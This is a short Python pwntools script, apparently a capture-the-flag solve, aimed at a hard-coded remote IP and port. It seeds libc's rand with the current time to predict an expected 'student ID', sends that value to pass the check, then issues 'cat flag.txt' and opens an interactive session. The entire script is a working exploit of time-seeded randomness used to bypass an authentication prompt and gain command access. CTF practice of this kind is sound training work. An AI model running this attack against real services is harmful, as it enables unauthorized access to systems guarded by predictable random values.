#!/usr/bin/env python3
from pwn import *
import time
import ctypes

HOST = '103.77.175.40'
PORT = 6061

p = remote(HOST, PORT)
libc = ctypes.CDLL("libc.so.6")

now = int(time.time())

libc.srand(now)

TIME = libc.rand() % 10000 + 20230000

p.recvuntil(b"Enter your studen ID: ")
p.sendline(str(TIME).encode())

output = p.recvline()

if b"Here you are!" in output:
    log.success(f"correct: {now} -> {TIME}")
    p.sendline(b"cat flag.txt")
    p.interactive()
else:
    log.failure(f"wrong: {now} -> {TIME}")
    p.close()